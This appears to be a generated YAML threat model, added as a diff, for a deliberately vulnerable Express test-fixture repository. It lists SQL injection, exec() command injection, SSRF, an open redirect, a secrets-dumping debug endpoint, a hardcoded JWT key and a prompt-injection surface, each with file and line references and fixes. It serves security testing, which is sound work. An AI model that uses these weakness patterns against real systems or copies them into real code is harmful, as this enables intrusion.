@@ -1,0 +1,2610 @@
+meta:
+  schema_version: 1
+  project: _last-repo
+  generated: '2026-09-17T15:26:22Z'
+  mode: full
+  model: claude-sonnet-4-6
+  analyst: context-v2 pipeline (claude-sonnet-4-6)
+  plugin_version: 0.6.0-beta.4
+  analysis_version: 5
+  assessment_depth: quick
+  invocation: --repo /plugin/tests/fixtures/e2e/_last-repo --output /plugin/tests/fixtures/e2e/_last-run
+    --full --assessment-depth quick --sarif --pentest-tasks --requirements /plugin/examples/appsec-requirements-example.yaml
+    --keep-runtime-files --pdf
+  reasoning_model: sonnet-economy
+  stride_model: claude-sonnet-4-6
+  triage_model: claude-sonnet-4-6
+  merger_model: claude-sonnet-4-6
+  scope: []
+  repo_url: null
+  team_owner: null
+  asset_classification: null
+  compliance_scope: []
+  git:
+    commit_sha: a5272cbf141a1de834c5ec498a48b513a38bfdff
+    branch: master
+  accepted_risks: []
+  check_requirements: true
+  stride_per_category_cap: 1
+  register_severity_floor: medium
+  business_context_sha256: null
+  business_context_source: null
+  open_user_registration: false
+  open_registration_source: actor-resolution
+  open_registration_resolution:
+    open: false
+    disputed: false
+    reason: not-established
+    evidence: []
+  component_selection:
+    mode: criteria
+    analyzed: 2
+    total: 4
+    selected:
+    - id: web-api
+      name: Express Web API
+      reasons:
+      - AI/LLM surface (OWASP LLM Top-10 — prompt injection / excessive agency, mandatory)
+      - internet-exposed (dmz,internet)
+    - id: auth
+      name: Authentication & Session Middleware
+      reasons:
+      - auth (M3.4 mandatory)
+      - internet-exposed (dmz,internet)
+    excluded:
+    - id: database
+      name: Relational Datastore
+      reason: out-of-scope at depth=quick
+    - id: ci-cd-pipeline
+      name: CI/CD Pipeline
+      reason: out-of-scope at depth=quick
+  boundary_selection:
+    depth: quick
+    max_candidates_per_component: 2
+    components:
+      web-api:
+        eligible_ids:
+        - tb-1
+        - tb-4
+        selected_ids:
+        - tb-1
+        - tb-4
+        omitted_ids: []
+        deferred_ids:
+        - tb-3
+        invalid_ids: []
+        focus_reasons:
+          tb-1:
+          - explicit external entry
+          tb-4:
+          - operator crossing (network)
+      auth:
+        eligible_ids: []
+        selected_ids: []
+        omitted_ids: []
+        deferred_ids: []
+        invalid_ids: []
+        focus_reasons: {}
+  enrichment_pass:
+    completed_at: '2026-09-17T15:26:34.509114+00:00'
+    yaml_sha256: d3cf5a0abd7cf663365688cf2667c27852195648939d0abbfa6cb543805f1cb3
+changelog:
+- version: 1
+  date: '2026-09-17'
+  time_local: 17:26 CEST
+  mode: full
+  assessment_depth: quick
+  reasoning_model: sonnet-economy
+  plugin_version: 0.6.0-beta.4
+  analysis_version: 5
+  run_id: '1789656407'
+  baseline_sha: null
+  current_sha: a5272cbf141a1de834c5ec498a48b513a38bfdff
+  changed_files: null
+  threat_count: 13
+  fingerprints:
+  - web-api|CWE-89|sql injection authentication bypass
+  - auth|CWE-78|os command injection via exec in /admin/export
+  - web-api|CWE-89|sql injection request data interpolated into a sql string server.js:12
+  - web-api|CWE-215|unauthenticated debug environment endpoint
+  - auth|CWE-321|hardcoded jwt signing key
+  - auth|CWE-200|unauthenticated debug endpoint exposes all environment secrets
+  - web-api|CWE-918|ssrf outbound request to a request-controlled url server.js:30
+  - web-api|CWE-770|unbounded llm consumption without auth or rate limit
+  - auth|CWE-284|unvalidated tenant header overrides authenticated identity
+  - web-api|CWE-862|sensitive rest route registered without authentication middleware server.js:22
+  - web-api|CWE-862|missing authorization on user record endpoint
+  - auth|CWE-778|missing authentication event logging
+  - auth|CWE-918|server-side request forgery without url validation
+  match_keys:
+  - server.js|CWE-89
+  - server.js|CWE-78
+  - server.js|CWE-89
+  - server.js|CWE-215
+  - server.js|hardcoded-key
+  - server.js|CWE-200
+  - server.js|CWE-918
+  - server.js|resource-exhaustion
+  - middleware/tenantcontext.js|CWE-284
+  - server.js|CWE-862
+  - server.js|CWE-862
+  - server.js|CWE-778
+  - server.js|CWE-918
+  mitigation_fingerprints:
+  - replace string-interpolated sql with parameterized queries in login handler
+  - enforce authentication and shell-safe invocation on /admin/export in server.js
+  - use parameterized / bound queries…
+  - remove the /debug/environment endpoint and source-managed jwt secret from produ…
+  - replace hardcoded jwt signing secret with runtime-injected environment variable…
+  - remove or gate /debug/environment route behind production check in server.js
+  - validate the url against a strict allowlist of hosts/schemes, resolve and block…
+  - add authentication, rate limiting, and max_tokens bound to the /assistant endpo…
+  - cross-check x-tenant-id against authenticated jwt tenant claim in tenantcontext…
+  - add an explicit auth middleware…
+  - add authentication and ownership check to get /users/:id before returning user…
+  - add structured security event logging to /login handler in server.js
+  - validate and bound outbound url in /webhooks/preview handler in server.js
+  instance_fingerprints:
+  - web-api|CWE-89|sql injection authentication bypass|server.js:12
+  - auth|CWE-78|os command injection via exec in /admin/export|server.js:23
+  - auth|CWE-78|os command injection via exec in /admin/export|server.js:23
+  - auth|CWE-78|os command injection via exec in /admin/export|server.js:23
+  - web-api|CWE-89|sql injection request data interpolated into a sql string server.js:12|server.js:12
+  - web-api|CWE-89|sql injection request data interpolated into a sql string server.js:12|server.js:18
+  - web-api|CWE-215|unauthenticated debug environment endpoint|server.js:41
+  - auth|CWE-321|hardcoded jwt signing key|server.js:9
+  - auth|CWE-200|unauthenticated debug endpoint exposes all environment secrets|server.js:41
+  - web-api|CWE-918|ssrf outbound request to a request-controlled url server.js:30|server.js:30
+  - web-api|CWE-770|unbounded llm consumption without auth or rate limit|server.js:36
+  - auth|CWE-284|unvalidated tenant header overrides authenticated identity|middleware/tenantContext.js:2
+  - web-api|CWE-862|sensitive rest route registered without authentication middleware server.js:22|server.js:22
+  - web-api|CWE-862|missing authorization on user record endpoint|server.js:18
+  - auth|CWE-778|missing authentication event logging|server.js:11
+  - auth|CWE-778|missing authentication event logging|server.js:6
+  - auth|CWE-918|server-side request forgery without url validation|server.js:30
+  delta_basis: initial
+  previous_date: null
+  previous_threat_count: null
+  reanalyzed_components:
+  - auth
+  - ci-cd-pipeline
+  - database
+  - web-api
+  carried_forward_components: []
+  added:
+    threats:
+    - T-001
+    - T-002
+    - T-003
+    - T-004
+    - T-005
+    - T-006
+    - T-007
+    - T-008
+    - T-009
+    - T-010
+    - T-011
+    - T-012
+    - T-013
+    mitigations:
+    - M-001
+    - M-002
+    - M-003
+    - M-004
+    - M-005
+    - M-006
+    - M-007
+    - M-008
+    - M-009
+    - M-010
+    - M-011
+    - M-012
+    - M-013
+    instances: []
+    components:
+    - auth
+    - ci-cd-pipeline
+    - database
+    - web-api
+    attack_surface: []
+  changed:
+    threats: []
+  resolved:
+    threats: []
+    reason_by_id: {}
+    instances: []
+  note: first full scan
+business_context_trace:
+  status: not_configured
+  source_kind: null
+  source: null
+  sha256: null
+  fields_present: []
+  component_coverage: []
+  applied_finding_count: 0
+abuse_case_analysis:
+  status: skipped
+  reason: skipped (auto - quick depth)
+  cases: []
+  catalog_evaluated: []
+components:
+- id: web-api
+  name: Express Web API
+  description: Main Express.js application server exposing HTTP routes on port 3000. Handles login, user lookup, admin file
+    export, webhook preview, AI assistant, open redirect, and debug endpoints. Executes raw SQL via string interpolation,
+    shell commands via exec(), LangChain/OpenAI calls, and arbitrary HTTP fetches without input validation.
+  paths:
+  - server.js
+  - routes/**/*.js
+  - models/*.js
+  tier: application
+  complexity: complex
+  framework: express
+  deployment_zones:
+  - internet
+  - dmz
+  handles_sensitive_data: true
+  sensitive_data:
+  - category: credentials
+    basis: observed
+    handling: processes
+    evidence:
+    - file: server.js
+      line: 12
+  - category: personal-data
+    basis: observed
+    handling: processes
+    evidence:
+    - file: server.js
+      line: 18
+  - category: secrets
+    basis: observed
+    handling: processes
+    evidence:
+    - file: server.js
+      line: 9
+  capabilities:
+  - capability: llm-calls
+    evidence:
+    - file: server.js
+      line: 35
+  - capability: url-fetch
+    evidence:
+    - file: server.js
+      line: 30
+  - capability: admin-functions
+    evidence:
+    - file: server.js
+      line: 22
+  threat_ids:
+  - T-001
+  - T-003
+  - T-004
+  - T-007
+  - T-008
+  - T-010
+  - T-011
+- id: auth
+  name: Authentication & Session Middleware
+  description: Express middleware implementing JWT-based login, partner API key validation, and tenant context extraction.
+    JWT is signed with a hardcoded secret in server.js. Partner API keys are validated against the database via partnerAuth
+    middleware. Tenant identity is derived from an unvalidated x-tenant-id request header.
+  paths:
+  - middleware/partnerAuth.js
+  - middleware/tenantContext.js
+  - server.js
+  tier: application
+  complexity: moderate
+  framework: express
+  deployment_zones:
+  - internet
+  - dmz
+  handles_sensitive_data: true
+  sensitive_data:
+  - category: credentials
+    basis: observed
+    handling: processes
+    evidence:
+    - file: server.js
+      line: 12
+  - category: secrets
+    basis: observed
+    handling: processes
+    evidence:
+    - file: server.js
+      line: 9
+  capabilities:
+  - capability: token-issuer
+    evidence:
+    - file: server.js
+      line: 14
+  threat_ids:
+  - T-002
+  - T-005
+  - T-006
+  - T-009
+  - T-012
+  - T-013
+- id: database
+  name: Relational Datastore
+  description: Relational database storing user accounts (email, role, tenant_id), partner records, and order data. Accessed
+    via Sequelize ORM and raw SQL string interpolation from the application tier. Database credentials are hardcoded in config/insecure-settings.ini.
+  paths:
+  - config/insecure-settings.ini
+  tier: data
+  complexity: simple
+  framework: null
+  deployment_zones:
+  - internal-network
+  handles_sensitive_data: true
+  sensitive_data:
+  - category: credentials
+    basis: observed
+    handling: stores
+    evidence:
+    - file: config/insecure-settings.ini
+      line: 2
+  - category: personal-data
+    basis: observed
+    handling: stores
+    evidence:
+    - file: models/User.js
+      line: 6
+  - category: secrets
+    basis: observed
+    handling: stores
+    evidence:
+    - file: config/insecure-settings.ini
+      line: 5
+  threat_ids: []
+- id: ci-cd-pipeline
+  name: CI/CD Pipeline
+  description: GitHub Actions workflow building and packaging the application with Docker. Uses unpinned action references
+    (v3 tags only) and inherits write-all default permissions. Docker image built from node:20-alpine without digest pinning
+    and runs as root.
+  paths:
+  - .github/workflows/**
+  - Dockerfile
+  - package.json
+  tier: application
+  complexity: simple
+  framework: null
+  deployment_zones:
+  - ci-cd-runtime
+  - build-pipeline
+  handles_sensitive_data: false
+  threat_ids: []
+data_flows:
+- id: df-001
+  from: external
+  to: web-api
+  from_entity: ext-api-client
+  label: POST /login — submit email and password, receive JWT
+  diagram_label: Login (credentials)
+  protocol: HTTP
+  direction: request-response
+  data_classification: Confidential
+  authentication:
+    scheme: none
+    scope: Login handler processes submitted credentials; no prior token required to call the endpoint
+    evidence:
+    - file: server.js
+      line: 11
+  route_refs:
+  - R-001
+  evidence:
+  - file: server.js
+    line: 11
+  - file: server.js
+    line: 12
+  provenance: route-extraction
+- id: df-002
+  from: external
+  to: web-api
+  from_entity: ext-api-client
+  label: GET /users/:id — retrieve user record by id, no auth check present
+  diagram_label: User lookup (unauthenticated)
+  protocol: HTTP
+  direction: request-response
+  data_classification: Confidential
+  authentication:
+    scheme: none
+    scope: Handler at server.js:17 performs no token or session check before querying the database
+    evidence:
+    - file: server.js
+      line: 17
+  access_group:
+    id: web-api-unprotected
+    mode: alternatives
+    label: Unauthenticated application routes
+  route_refs:
+  - R-002
+  evidence:
+  - file: server.js
+    line: 17
+  - file: server.js
+    line: 18
+  provenance: route-extraction
+- id: df-003
+  from: external
+  to: web-api
+  from_entity: ext-api-client
+  label: POST /admin/export — tar-compress a caller-supplied path, no auth check present
+  diagram_label: Admin export (unauthenticated)
+  protocol: HTTP
+  direction: request-response
+  data_classification: Internal
+  authentication:
+    scheme: none
+    scope: Handler at server.js:22 performs no token or role check before calling exec()
+    evidence:
+    - file: server.js
+      line: 22
+  access_group:
+    id: web-api-unprotected
+    mode: alternatives
+    label: Unauthenticated application routes
+  route_refs:
+  - R-003
+  evidence:
+  - file: server.js
+    line: 22
+  - file: server.js
+    line: 23
+  provenance: route-extraction
+- id: df-004
+  from: external
+  to: web-api
+  from_entity: ext-api-client
+  label: POST /webhooks/preview — fetch caller-supplied URL and return response body
+  diagram_label: Webhook preview (unauthenticated)
+  protocol: HTTP
+  direction: request-response
+  data_classification: Internal
+  authentication:
+    scheme: none
+    scope: Handler at server.js:29 performs no token check before issuing the outbound fetch
+    evidence:
+    - file: server.js
+      line: 29
+  access_group:
+    id: web-api-unprotected
+    mode: alternatives
+    label: Unauthenticated application routes
+  route_refs:
+  - R-004
+  evidence:
+  - file: server.js
+    line: 29
+  - file: server.js
+    line: 30
+  provenance: route-extraction
+- id: df-005
+  from: external
+  to: web-api
+  from_entity: ext-api-client
+  label: POST /assistant — forward user prompt to LLM, no auth check present
+  diagram_label: AI assistant (unauthenticated)
+  protocol: HTTP
+  direction: request-response
+  data_classification: Internal
+  authentication:
+    scheme: none
+    scope: Handler at server.js:34 performs no token check before constructing and sending the LLM prompt
+    evidence:
+    - file: server.js
+      line: 34
+  access_group:
+    id: web-api-unprotected
+    mode: alternatives
+    label: Unauthenticated application routes
+  route_refs:
+  - R-005
+  evidence:
+  - file: server.js
+    line: 34
+  - file: server.js
+    line: 36
+  provenance: route-extraction
+- id: df-006
+  from: external
+  to: web-api
+  from_entity: ext-api-client
+  label: GET /redirect — redirect to caller-supplied next URL, no auth check present
+  diagram_label: Open redirect (unauthenticated)
+  protocol: HTTP
+  direction: request-response
+  data_classification: Public
+  authentication:
+    scheme: none
+    scope: Handler at server.js:40 passes req.query.next directly to res.redirect() with no check
+    evidence:
+    - file: server.js
+      line: 40
+  access_group:
+    id: web-api-unprotected
+    mode: alternatives
+    label: Unauthenticated application routes
+  route_refs:
+  - R-006
+  evidence:
+  - file: server.js
+    line: 40
+  provenance: route-extraction
+- id: df-007
+  from: external
+  to: web-api
+  from_entity: ext-api-client
+  label: GET /debug/environment — return full process.env as JSON, no auth check present
+  diagram_label: Debug env dump (unauthenticated)
+  protocol: HTTP
+  direction: request-response
+  data_classification: Restricted
+  authentication:
+    scheme: none
+    scope: Handler at server.js:41 returns process.env unconditionally with no auth or role check
+    evidence:
+    - file: server.js
+      line: 41
+  access_group:
+    id: web-api-unprotected
+    mode: alternatives
+    label: Unauthenticated application routes
+  route_refs:
+  - R-007
+  evidence:
+  - file: server.js
+    line: 41
+  provenance: route-extraction
+- id: df-008
+  from: external
+  to: web-api
+  from_entity: ext-partner
+  label: GET /orders — retrieve partner order list; requires valid x-partner-api-key header
+  diagram_label: Partner orders (API key)
+  protocol: HTTP
+  direction: request-response
+  data_classification: Confidential
+  authentication:
+    scheme: api-key
+    scope: partnerAuth middleware at routes/partner-api/orders.js:5 checks x-partner-api-key header and resolves it against
+      the database; absent or invalid key returns 401/403
+    evidence:
+    - file: middleware/partnerAuth.js
+      line: 2
+    - file: middleware/partnerAuth.js
+      line: 3
+    - file: routes/partner-api/orders.js
+      line: 5
+  route_refs:
+  - R-008
+  evidence:
+  - file: routes/partner-api/orders.js
+    line: 5
+  - file: routes/partner-api/orders.js
+    line: 6
+  - file: middleware/partnerAuth.js
+    line: 2
+  provenance: route-extraction
+- id: df-009
+  from: web-api
+  to: external
+  to_entity: ext-openai
+  label: LangChain ChatOpenAI.invoke() — send user-supplied prompt to OpenAI gpt-4o-mini
+  diagram_label: LLM inference (prompt)
+  protocol: HTTPS
+  direction: request-response
+  data_classification: Internal
+  evidence:
+  - file: server.js
+    line: 35
+  - file: server.js
+    line: 36
+  provenance: architecture
+- id: df-010
+  from: web-api
+  to: external
+  label: fetch(req.body.url) — arbitrary outbound HTTP request to caller-controlled URL
+  diagram_label: Outbound SSRF fetch
+  protocol: HTTP
+  direction: request-response
+  data_classification: Internal
+  evidence:
+  - file: server.js
+    line: 30
+  provenance: architecture
+- id: df-011
+  from: web-api
+  to: database
+  label: Raw SQL queries and ORM calls — login lookup, user fetch, partner auth, and order retrieval
+  diagram_label: SQL / ORM queries
+  protocol: SQL
+  direction: request-response
+  data_classification: Confidential
+  evidence:
+  - file: server.js
+    line: 12
+  - file: server.js
+    line: 18
+  - file: middleware/partnerAuth.js
+    line: 4
+  - file: routes/partner-api/orders.js
+    line: 7
+  provenance: architecture
+external_entities:
+- id: ext-api-client
+  name: Anonymous HTTP Client
+  kind: legitimate-role
+  access: internet-anon
+  description: Unauthenticated HTTP client consuming public and unauthenticated API endpoints. Includes end users, automated
+    scanners, and attacker tooling reaching the application over the internet.
+  evidence:
+  - file: server.js
+    line: 11
+  - file: server.js
+    line: 40
+- id: ext-partner
+  name: Partner System
+  kind: legitimate-role
+  access: internet-anon
+  description: External partner system authenticating via x-partner-api-key header to access partner-scoped order data. API
+    key is validated against the database by partnerAuth middleware.
+  evidence:
+  - file: middleware/partnerAuth.js
+    line: 2
+  - file: routes/partner-api/orders.js
+    line: 5
+- id: ext-openai
+  name: OpenAI API (LangChain)
+  kind: external-service
+  service_roles:
+  - role: llm-inference
+    evidence:
+    - file: package.json
+      line: 17
+    - file: server.js
+      line: 3
+  description: OpenAI LLM inference API accessed via @langchain/openai SDK. Receives prompt constructed by directly concatenating
+    unvalidated user input, exposing a prompt injection surface.
+  evidence:
+  - file: server.js
+    line: 35
+  - file: server.js
+    line: 36
+assets:
+- id: A-001
+  name: User Account Records
+  classification: Confidential
+  description: Relational records storing user email, role enum (admin/member), and tenant_id. Queried by raw SQL in server.js;
+    email and password submitted at login are passed unsanitized into a string-interpolated query.
+  linked_threats:
+  - T-001
+  - T-003
+  component_refs:
+  - component_id: database
+    relation: stored
+    evidence:
+    - file: models/User.js
+      line: 6
+  - component_id: web-api
+    relation: processed
+    evidence:
+    - file: server.js
+      line: 18
+- id: A-002
+  name: Partner Order Records
+  classification: Confidential
+  description: Order data scoped to a partner identity and returned by GET /orders. Accessible to any caller presenting a
+    valid partner API key; no row-level isolation beyond partner ownership is visible in the route handler.
+  linked_threats: []
+  component_refs:
+  - component_id: database
+    relation: stored
+    evidence:
+    - file: routes/partner-api/orders.js
+      line: 7
+  - component_id: web-api
+    relation: processed
+    evidence:
+    - file: routes/partner-api/orders.js
+      line: 7
+- id: A-003
+  name: JWT Signing Secret
+  classification: Restricted
+  description: Hardcoded JWT signing secret stored in server.js source. Any party with repository read access can forge valid
+    JWT tokens for any user identity, bypassing all authentication.
+  linked_threats:
+  - T-005
+  component_refs:
+  - component_id: auth
+    relation: processed
+    evidence:
+    - file: server.js
+      line: 9
+  - component_id: web-api
+    relation: processed
+    evidence:
+    - file: server.js
+      line: 9
+- id: A-004
+  name: Database Credentials
+  classification: Restricted
+  description: Database password hardcoded in config/insecure-settings.ini committed to the repository. Grants full database
+    access to anyone with repository read permissions.
+  linked_threats:
+  - T-001
+  - T-003
+  component_refs:
+  - component_id: database
+    relation: stored
+    evidence:
+    - file: config/insecure-settings.ini
+      line: 2
+- id: A-005
+  name: Partner API Keys
+  classification: Restricted
+  description: API keys issued to partner systems and validated by partnerAuth middleware against the database. Compromise
+    of any key grants access to the corresponding partner's order data.
+  linked_threats: []
+  component_refs:
+  - component_id: auth
+    relation: processed
+    evidence:
+    - file: middleware/partnerAuth.js
+      line: 2
+  - component_id: database
+    relation: stored
+    evidence:
+    - file: middleware/partnerAuth.js
+      line: 4
+- id: A-006
+  name: Runtime Environment Variables
+  classification: Restricted
+  description: Full process.env contents returned as JSON by the unauthenticated GET /debug/environment endpoint. Likely contains
+    runtime secrets, API keys, and connection strings injected at deployment time.
+  linked_threats: []
+  component_refs:
+  - component_id: web-api
+    relation: processed
+    evidence:
+    - file: server.js
+      line: 41
+attack_surface:
+- entry_point: POST /login
+  protocol: HTTP
+  auth_required: false
+  notes: Login endpoint performs authentication via SQL string interpolation at server.js:12 enabling SQL injection to bypass
+    credential check.
+  relevance_tags:
+  - authentication
+- entry_point: GET /users/:id
+  protocol: HTTP
+  auth_required: false
+  notes: Unauthenticated user lookup; raw SQL with string interpolation at server.js:18 is a SQL injection sink.
+- entry_point: POST /admin/export
+  protocol: HTTP
+  auth_required: false
+  notes: Unauthenticated admin endpoint; exec() with unsanitized user-supplied path enables command injection and arbitrary
+    file read.
+  relevance_tags:
+  - management
+  - missing-auth
+- entry_point: POST /webhooks/preview
+  protocol: HTTP
+  auth_required: false
+  notes: Unauthenticated webhook preview; fetch(req.body.url) enables SSRF to internal network and cloud metadata endpoints.
+- entry_point: POST /assistant
+  protocol: HTTP
+  auth_required: false
+  notes: Unauthenticated LLM endpoint; user input concatenated directly into prompt enabling prompt injection against gpt-4o-mini.
+  relevance_tags:
+  - missing-auth
+  - llm
+- entry_point: GET /redirect
+  protocol: HTTP
+  auth_required: false
+  notes: Unauthenticated open redirect; res.redirect(req.query.next) with no validation enables phishing redirection.
+- entry_point: GET /debug/environment
+  protocol: HTTP
+  auth_required: false
+  notes: Unauthenticated debug endpoint exposing full process.env; discloses runtime secrets and deployment configuration.
+  relevance_tags:
+  - management
+  - missing-auth
+- entry_point: GET /orders
+  protocol: HTTP
+  auth_required: false
+  notes: Partner API authenticated via x-partner-api-key header; only authenticated route in the application.
+trust_boundaries:
+- name: Internet to Express API
+  kind: network
+  assumption: Every route that accesses user or partner data is protected by an authentication middleware before the handler
+    executes.
+  evidence:
+  - file: server.js
+    line: 11
+  - file: server.js
+    line: 17
+  - file: server.js
+    line: 22
+  - file: middleware/partnerAuth.js
+    line: 2
+  - file: middleware/tenantContext.js
+    line: 1
+  confidence: confirmed
+  resolution_status: resolved
+  sources:
+  - detected
+  from: external
+  to: web-api
+  assumption_legs:
+  - leg: validation
+    condition: Every inbound request body and path parameter is schema-checked before it reaches business logic.
+  - leg: authentication
+    condition: Every route that returns user or partner data requires a valid credential (JWT or API key) before the handler
+      executes.
+  - leg: authorization
+    condition: Every object reference (user ID, partner record) is checked against the authenticated subject's identity before
+      the response is sent.
+  surface: network
+  transition: []
+  id: tb-1
+- name: Express app to relational database
+  kind: network
+  assumption: Every database query is constructed using parameterized statements so that no user-supplied value is interpreted
+    as SQL.
+  evidence:
+  - file: server.js
+    line: 12
+  - file: server.js
+    line: 18
+  - file: middleware/partnerAuth.js
+    line: 4
+  - file: routes/partner-api/orders.js
+    line: 7
+  confidence: confirmed
+  resolution_status: resolved
+  sources:
+  - detected
+  from: web-api
+  to: database
+  assumption_legs:
+  - leg: data-interpretation
+    condition: Every database query is constructed using parameterized statements, preventing user input from being interpreted
+      as SQL.
+  covers_components:
+  - database
+  - web-api
+  surface: network
+  transition: []
+  id: tb-3
+- name: Express app to external services (OpenAI and SSRF fetch)
+  kind: third-party
+  assumption: Nothing attacker-controlled reaches external services unfiltered.
+  evidence:
+  - file: server.js
+    line: 30
+  - file: server.js
+    line: 35
+  - file: server.js
+    line: 36
+  confidence: confirmed
+  resolution_status: resolved
+  sources:
+  - detected
+  from: web-api
+  to: external
+  assumption_legs:
+  - leg: egress-content
+    condition: No user-supplied content is forwarded to an external service without sanitization or scope restriction.
+  - leg: egress-destination
+    condition: Outbound HTTP calls target only a fixed set of approved external endpoints, not caller-controlled URLs.
+  - leg: response-trust
+    condition: Responses from external services are treated as untrusted input and are not executed or forwarded without validation.
+  surface: network
+  transition:
+  - operator
+  id: tb-4
+- name: 'GitHub push/PR to Actions CI: GITHUB_TOKEN repository permissions'
+  kind: build
+  assumption: Workflow secrets are accessible only to runs triggered by code merged into a protected branch.
+  evidence:
+  - file: .github/workflows/ci.yml
+    line: 1
+  - file: .github/workflows/ci.yml
+    line: 3
+  confidence: inferred
+  resolution_status: resolved
+  sources:
+  - detected
+  from: external
+  to: ci-cd-pipeline
+  enforcement_point: GITHUB_TOKEN repository permissions
+  assumption_legs:
+  - leg: authentication
+    condition: Workflow runs are triggered only by authenticated GitHub users with write access to the repository.
+  - leg: authorization
+    condition: Repository secrets and GITHUB_TOKEN scopes are restricted so that pull requests from forks cannot access sensitive
+      credentials.
+  surface: build-pipeline
+  transition:
+  - operator
+  id: tb-2
+security_controls:
+- domain: Session and Token Controls
+  control: Session Token Validation (JWT Based)
+  effectiveness: Unsafe
+  kind: mechanism
+  assessment: 'JWT is issued at server.js:14 signed with a secret hardcoded in source (server.js:9: `const secret = ''****
+    (29 chars)''`). Any party with read access to the source can forge arbitrary tokens. No algorithm whitelist or verification
+    middleware is applied at route level.'
+  implementation: server.js:9,14
+  rule_id: null
+  status_note: Hardcoded JWT secret allows arbitrary token forgery.
+  audit_flags:
+  - control_name_canonicalised
+  - control_domain_reclassified_from_Identity and Authentication Controls
+- domain: Identity and Authentication Controls
+  control: Partner API Key Authentication
+  effectiveness: Partial
+  kind: mechanism
+  assessment: partnerAuth middleware (middleware/partnerAuth.js:1-8) enforces an x-partner-api-key header and rejects absent
+    or unrecognised keys. Applied to the partner orders route (routes/partner-api/orders.js:5) but absent from /admin/export,
+    /assistant, /debug/environment, and /redirect.
+  implementation: middleware/partnerAuth.js, routes/partner-api/orders.js:5
+  rule_id: ARCH-AUTHN-001
+  status_note: Auth mechanism present on partner routes; missing on admin, AI, and debug routes.
+- domain: Identity and Authentication Controls
+  control: Route Authentication Enforcement
+  effectiveness: Unsafe
+  kind: cross-cutting
+  assessment: POST /admin/export (server.js:22), POST /assistant (server.js:34), GET /debug/environment (server.js:41), and
+    GET /redirect (server.js:40) are registered without any authentication middleware. /admin/export executes shell commands;
+    /debug/environment exposes process.env; /assistant makes LLM calls. All are reachable by unauthenticated callers.
+  implementation: server.js:22,34,40,41
+  rule_id: ARCH-AUTHN-001
+  status_note: State-changing and sensitive routes reachable without credentials.
+- domain: Authorization Controls
+  control: Object-Level Ownership Check (BOLA/IDOR)
+  effectiveness: Missing
+  kind: mechanism
+  assessment: GET /users/:id (server.js:17-19) queries any user record by the path parameter without verifying the caller's
+    identity or comparing req.params.id against the authenticated subject. No ownership assertion is present anywhere in the
+    handler.
+  implementation: server.js:17-19
+  rule_id: ARCH-BOLA-001
+  status_note: No ownership check on user record retrieval.
+- domain: Authorization Controls
+  control: Tenant Identity Validation
+  effectiveness: Unsafe
+  kind: mechanism
+  assessment: tenantContext.js (line 2) reads the tenant identity from the x-tenant-id request header without cross-referencing
+    it against the authenticated user's token claims or session. Any caller can assert an arbitrary tenant by supplying a
+    header value, enabling cross-tenant data access.
+  implementation: middleware/tenantContext.js:2
+  rule_id: null
+  status_note: Tenant identity is caller-asserted; authentication binding absent.
+- domain: Authorization Controls
+  control: Management Endpoint Protection
+  effectiveness: Partial
+  kind: mechanism
+  assessment: POST /admin/export (server.js:22) and GET /debug/environment (server.js:41) are management-class endpoints.
+    Authentication status is unknown (no middleware visible) and no role-based authorization is applied. Confidence is low
+    because middleware could be applied elsewhere, but no positive signal was found.
+  implementation: server.js:22,41
+  rule_id: ARCH-MGMT-001
+  status_note: Auth and authz status on admin and debug endpoints is unconfirmed.
+- domain: Query Construction and Data Access Controls
+  control: SQL Parameterized Queries
+  effectiveness: Unsafe
+  kind: mechanism
+  assessment: 'Two login and user-lookup queries concatenate user-supplied values directly into SQL strings: server.js:12
+    interpolates req.body.email and req.body.password; server.js:18 interpolates req.params.id. Both bypass Sequelize''s parameterization
+    layer and are exploitable as SQL injection.'
+  implementation: server.js:12,18
+  rule_id: ARCH-SQLI-001
+  status_note: Raw SQL string interpolation at login and user-lookup routes.
+  audit_flags:
+  - control_domain_reclassified_from_Input Validation and Injection Prevention
+- domain: Input Validation and Injection Prevention
+  control: OS Command Injection Prevention
+  effectiveness: Missing
+  kind: mechanism
+  assessment: server.js:23 passes req.body.path directly into a shell command via exec(). No sanitization, allowlist, or shell-escape
+    is applied. An attacker supplies path traversal or shell metacharacters to execute arbitrary OS commands.
+  implementation: server.js:23
+  rule_id: null
+  status_note: No command injection protection on /admin/export exec() call.
+- domain: Input Boundary Validation Controls
+  control: Schema and Allowlist Input Validation
+  effectiveness: Missing
+  kind: cross-cutting
+  assessment: No centralized request-body validation middleware (e.g., Joi, Zod, express-validator) is present. Individual
+    route handlers apply no type or schema checks before passing values to SQL, shell, fetch, or LLM. All inbound surfaces
+    are fully unvalidated.
+  implementation: server.js (all routes)
+  rule_id: ARCH-INPUT-001
+  status_note: No schema or allowlist validation applied to any request handler.
+  audit_flags:
+  - control_domain_reclassified_from_Input Validation and Injection Prevention
+- domain: File Parser and Outbound Request Controls
+  control: SSRF Egress URL Filtering
+  effectiveness: Missing
+  kind: mechanism
+  assessment: POST /webhooks/preview (server.js:29-31) fetches req.body.url without validation, allowlisting, or redirect-following
+    limits. An attacker can use this to probe internal network resources, cloud metadata endpoints, or exhaust server connections.
+  implementation: server.js:30
+  rule_id: null
+  status_note: Attacker-controlled URL passed directly to fetch() with no restriction.
+  audit_flags:
+  - control_domain_reclassified_from_Input Validation and Injection Prevention
+- domain: Input Validation and Injection Prevention
+  control: Open Redirect Prevention
+  effectiveness: Missing
+  kind: mechanism
+  assessment: GET /redirect (server.js:40) passes req.query.next directly to res.redirect() without allowlisting or scheme
+    validation. Any caller can redirect users to an arbitrary external URL.
+  implementation: server.js:40
+  rule_id: null
+  status_note: No allowlist or scheme check on redirect destination.
+- domain: Input Validation and Injection Prevention
+  control: Prompt Injection Prevention
+  effectiveness: Missing
+  kind: mechanism
+  assessment: 'POST /assistant (server.js:35-37) constructs the LangChain prompt as `Follow the user''s instructions exactly:
+    ${req.body.prompt}`. The system instruction explicitly directs the model to comply with user input, removing any sandboxing.
+    No content policy, output filter, or scope restriction is applied.'
+  implementation: server.js:35-36
+  rule_id: null
+  status_note: LLM invoked with attacker-controlled prompt and no scope restriction.
+- domain: Cryptography Secrets and Data Protection
+  control: JWT Secret Management
+  effectiveness: Unsafe
+  kind: primitive
+  assessment: The JWT signing secret is a literal string constant in server.js:9. It is committed to version control, not
+    loaded from an environment variable or secret manager. Any developer or CI artifact consumer can extract and use it to
+    forge valid tokens.
+  implementation: server.js:9
+  rule_id: null
+  status_note: JWT secret committed in source; trivially extractable.
+  audit_flags:
+  - control_domain_reclassified_from_Session and Token Management
+- domain: Cryptography and Secrets
+  control: Credential and Secret Storage
+  effectiveness: Unsafe
+  kind: mechanism
